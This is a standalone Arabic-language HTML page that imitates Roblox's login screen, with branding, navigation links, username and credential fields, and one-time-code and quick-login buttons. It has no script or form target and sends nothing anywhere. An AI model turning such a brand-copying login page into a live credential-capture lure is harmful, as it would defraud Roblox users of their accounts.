<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Roblox</title>

<style>
body{
  margin:0;
  background:#1c1f26;
  font-family:Arial, sans-serif;
  color:white;
}

/* الشريط العلوي */
.nav{
  background:#111;
  height:60px;
  display:flex;
  align-items:center;
  padding:0 20px;
}

.nav b{
  font-size:22px;
  margin-right:25px;
}

.nav a{
  color:#ccc;
  text-decoration:none;
  margin-right:18px;
  font-size:14px;
}

.nav a:hover{color:white}

/* صندوق الدخول */
.main{
  display:flex;
  justify-content:center;
  margin-top:60px;
}

.box{
  background:#23262f;
  width:380px;
  padding:25px;
  border-radius:12px;
  box-shadow:0 0 20px rgba(0,0,0,.5);
}

h2{text-align:center;}

input{
  width:100%;
  padding:12px;
  margin:10px 0;
  border:none;
  border-radius:8px;
  background:#2f3340;
  color:white;
}

button.mainbtn{
  width:100%;
  padding:12px;
  background:#2a7cff;
  border:none;
  border-radius:8px;
  color:white;
  font-weight:bold;
  margin-top:10px;
}

button.sec{
  width:100%;
  padding:12px;
  background:#2f3340;
  border:none;
  border-radius:8px;
  color:white;
  margin-top:10px;
}

.small{text-align:center;font-size:13px;color:#cfcfcf;margin:12px 0;}
.line{height:1px;background:#444;margin:15px 0;}
</style>
</head>
<body>

<div class="nav">
  <b>ROBLOX</b>
  <a href="#">الرئيسية</a>
  <a href="#">السوق</a>
  <a href="#">إنشاء</a>
  <a href="#">Robux</a>
</div>

<div class="main">
<div class="box">
  <h2>تسجيل الدخول إلى Roblox</h2>

  <input type="text" placeholder="اسم المستخدم">
  <input type="text" placeholder="خبراتك">

  <button class="mainbtn">تسجيل الدخول</button>

  <div class="small">نسيت كلمة المرور أو اسم المستخدم؟</div>
  <div class="line"></div>

  <button class="sec">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
  <button class="sec">تسجيل دخول سريع</button>

  <div class="small">ليس لديك حساب؟ اشترك</div>
</div>
</div>

</body>
</html>
